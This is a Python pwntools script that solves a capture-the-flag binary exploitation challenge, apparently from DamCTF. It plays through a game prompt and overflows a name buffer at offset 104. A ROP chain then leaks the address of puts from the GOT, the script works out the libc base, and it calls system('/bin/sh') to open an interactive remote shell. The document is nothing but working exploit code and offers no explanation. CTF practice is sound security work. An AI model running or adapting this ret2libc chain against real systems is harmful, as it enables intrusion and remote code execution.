from platform import system
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./dnd.patch"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("dnd.chals.damctf.xyz", 30813)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()



while True:
    data = io.recv(0xff)
    if b"ttack" in data:
        io.sendline(b"a")
    elif b"What is your name" in data:
        break

ret = 0x40201a
pop_rdi = 0x402640
puts_got = elf.got.get("puts", 0)
puts_plt = elf.plt.get("puts", 0)
main = 0x0402988

payload = b"a" * 104
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(0)
payload += p64(puts_plt)
payload += p64(main)

# ddebug()
io.sendline(payload)
puts_addr = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
log.success("puts:-----> " + hex(puts_addr))
libc.address = puts_addr - libc.symbols["puts"] 
log.success("libc:-----> " + hex(libc.address))

binsh = next(libc.search("/bin/sh"))
log.success("binsh:-----> " + hex(binsh))
systemaddr = libc.symbols["system"]
log.success("system:-----> " + hex(systemaddr))

payload = b"a" * 104
payload += p64(ret)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(0)
payload += p64(systemaddr)

while True:
    data = io.recv(0xff)
    if b"ttack" in data:
        io.sendline(b"a")
    elif b"What is your name" in data:
        break
ddebug(f"b *{pop_rdi}")
io.sendline(payload)
io.interactive()

